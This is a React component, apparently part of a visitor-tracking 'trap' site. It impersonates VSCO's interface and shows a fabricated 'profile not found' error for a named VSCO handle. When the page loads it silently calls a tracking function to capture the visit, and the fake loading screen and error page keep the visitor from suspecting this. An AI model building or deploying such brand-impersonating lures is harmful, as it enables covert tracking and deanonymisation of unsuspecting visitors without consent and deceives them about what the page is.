import { useEffect, useState } from 'react';
import { captureAndSaveVisit } from '../services/trackerService';
import './VscoTrapPage.css';

export default function VscoTrapPage() {
  const [phase, setPhase] = useState('loading'); // 'loading' | 'error'

  useEffect(() => {
    // Capture visit silently in background
    captureAndSaveVisit();

    // Show loading screen briefly then transition to "error"
    const timer = setTimeout(() => {
      setPhase('error');
    }, 2200);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="vsco-root">
      {/* VSCO Header */}
      <header className="vsco-header">
        <VscoLogo />
        <nav className="vsco-nav">
          <span>Explore</span>
          <span>Store</span>
          <span>Log in</span>
          <button className="vsco-btn-join">Join VSCO</button>
        </nav>
      </header>

      {/* Main Content */}
      <main className="vsco-main">
        {phase === 'loading' ? <LoadingState /> : <ErrorState />}
      </main>

      {/* VSCO Footer */}
      <footer className="vsco-footer">
        <VscoLogo small />
        <div className="vsco-footer-links">
          <span>© 2024 VSCO</span>
          <span>Privacy</span>
          <span>Terms</span>
          <span>Cookies</span>
          <span>Help</span>
        </div>
      </footer>
    </div>
  );
}

function LoadingState() {
  return (
    <div className="vsco-loading">
      <div className="vsco-profile-skeleton">
        <div className="skeleton-avatar" />
        <div className="skeleton-name" />
        <div className="skeleton-handle" />
        <div className="skeleton-grid">
          {Array.from({ length: 9 }).map((_, i) => (
            <div key={i} className="skeleton-cell" />
          ))}
        </div>
      </div>
    </div>
  );
}

function ErrorState() {
  return (
    <div className="vsco-error">
      <div className="vsco-error-card">
        <div className="vsco-error-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
            <circle cx="12" cy="12" r="10" />
            <line x1="12" y1="8" x2="12" y2="12" />
            <circle cx="12" cy="16" r="0.5" fill="currentColor" />
          </svg>
        </div>
        <h1 className="vsco-error-title">This profile isn't available</h1>
        <p className="vsco-error-subtitle">
          <strong>vsco.co/laiserrano</strong> may have been removed or this link may be broken.
        </p>
        <p className="vsco-error-hint">
          If you think this is a mistake, try refreshing the page or check back later.
        </p>
        <div className="vsco-error-actions">
          <button
            className="vsco-btn-primary"
            onClick={() => window.location.reload()}
          >
            Try again
          </button>
          <button
            className="vsco-btn-secondary"
            onClick={() => window.open('https://vsco.co', '_blank')}
          >
            Go to VSCO
          </button>
        </div>
        <p className="vsco-error-code">Error 404 · Profile not found</p>
      </div>
    </div>
  );
}

function VscoLogo({ small = false }) {
  return (
    <div className={`vsco-logo ${small ? 'vsco-logo--small' : ''}`}>
      <svg viewBox="0 0 80 22" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
        {/* V */}
        <path d="M0 0h3.6l4.4 13.8L12.4 0H16L10 22H6L0 0Z" />
        {/* S */}
        <path d="M21 17.5c1.4.9 3 1.4 4.7 1.4 2 0 3.2-.8 3.2-2.1 0-1.2-.8-1.9-3-2.6-2.8-.9-4.5-2.2-4.5-4.6 0-2.6 2.1-4.6 5.5-4.6 1.7 0 3.1.4 4.3 1l-.9 2.7c-.9-.6-2.1-1-3.4-1-2 0-2.9.9-2.9 1.9 0 1.2.9 1.8 3.2 2.5 3 1 4.4 2.4 4.4 4.8 0 2.6-2 4.7-5.9 4.7-1.8 0-3.6-.5-5-1.3l1-2.8Z" />
        {/* C */}
        <path d="M46.5 19.5c-1.4.8-3.1 1.2-5 1.2-5 0-8.5-3.3-8.5-8.2C33 7.3 36.6 4 41.7 4c1.7 0 3.3.4 4.6 1l-.8 2.8c-1-.5-2.2-.9-3.7-.9-3.3 0-5.4 2.2-5.4 5.7 0 3.6 2.2 5.8 5.3 5.8 1.5 0 2.8-.4 3.9-1l.9 3.1Z" />
        {/* O */}
        <path d="M59.5 4c5.2 0 8.5 3.4 8.5 8.2 0 5.1-3.5 8.5-8.7 8.5-5.1 0-8.4-3.5-8.4-8.3 0-5 3.4-8.4 8.6-8.4Zm-.1 2.9c-3.1 0-5.2 2.3-5.2 5.5 0 3.3 2.1 5.5 5.2 5.5 3.1 0 5.2-2.2 5.2-5.6 0-3.2-2.1-5.4-5.2-5.4Z" />
      </svg>
    </div>
  );
}
